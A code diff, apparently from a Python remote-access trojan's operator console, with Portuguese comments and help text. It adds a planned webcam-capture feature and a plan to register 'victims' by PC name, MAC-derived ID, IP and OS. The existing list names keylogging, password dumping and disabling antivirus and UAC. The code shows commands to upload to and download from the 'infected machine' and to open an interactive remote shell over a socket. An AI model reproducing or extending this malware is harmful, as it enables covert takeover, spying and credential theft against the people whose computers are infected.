@@ -9,6 +9,7 @@
 # copiar arquivos
 # copiar pasta
 # screenshot
+# tirar foto da webcan se ela tiver
 # desabilitar firewall / antivirus
 # desabilitar UAC
 # dump de senhas windows, google chrome, internet explorer
@@ -16,6 +17,16 @@
 # keylogger
 # localização geografica
 # trocar wallpaper do computador
+
+
+'''
+cadastrar todos as vitmas ->
+nome do pc:
+ID: # gerada pelo hash do mac adress
+ip externo ou interno do computador
+sistema operacional
+entrar com shell nele
+'''
 
 import os
 import datetime
@@ -32,6 +43,7 @@ def ajuda():
     print('{0}Comandos{1}:\n{2}upload{3} - Escolha um arquivo para fazer upload na maquina infectada.').format(YELLOW, END, RED, END)
     print('{0}shell{1} - Para obter uma shell na maquina do cliente.').format(RED, END)
     print('{0}download{1} - Faz o download de um arquivo na maquina infectada para sua maquina.').format(RED, END)
+    print('{0}exit{1} - Sai do programa.').format(RED, END)
     print('{0}clear{1} - Limpa a tela.').format(RED, END)
 
 def upload(s, caminho_arquivo=False):
@@ -66,8 +78,7 @@ def shell(s):
         try:
             executar = raw_input('\33[93m~> \033[0m')
             s.send(executar)
-            if(executar == '/exit'):
-                s.send('/exit')
+            if(executar == 'exit'):
                 break
             retorno = s.recv(1024)
             print(retorno)
@@ -89,6 +100,9 @@ def identificador(comando, s):
             ajuda()
         elif(comando[0]=='clear'):
             os.system('clear')
+        elif(comando[0]=='exit'):
+            print('você escolheu sair\n')
+            exit()
         else:
             print('{0}Comando errado, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
             return
